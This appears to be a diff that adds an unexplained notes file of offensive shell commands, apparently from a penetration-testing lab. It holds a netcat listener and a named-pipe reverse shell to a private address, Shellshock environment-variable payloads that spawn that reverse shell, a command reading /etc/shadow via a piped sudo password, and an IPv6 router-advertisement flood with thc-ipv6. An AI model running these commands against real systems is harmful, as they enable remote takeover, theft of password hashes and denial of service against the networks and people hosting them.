@@ -1,0 +1,21 @@
+sudo nc -nvlp 80
+
+mknod /tmp/backpipe p 
+
+/bin/sh 0</tmp/backpipe | nc 192.168.62.10 80 1>/tmp/backpipe
+
+env x='() { :;}; echo vulnerable' bash -c 'echo hello'
+
+
+env x='() { :;}; mknod /tmp/backpipe p ' bash -c 'echo hello'
+
+env x='() { :;}; /bin/sh 0</tmp/backpipe | nc 192.168.62.10 80 1>/tmp/backpipe &' bash -c 'echo hello'
+
+
+echo 'Passw0rd' | sudo -S cat /etc/shadow
+
+sudo su
+
+apt-get install thc-ipv6
+
+atk6-flood_router26 eth0
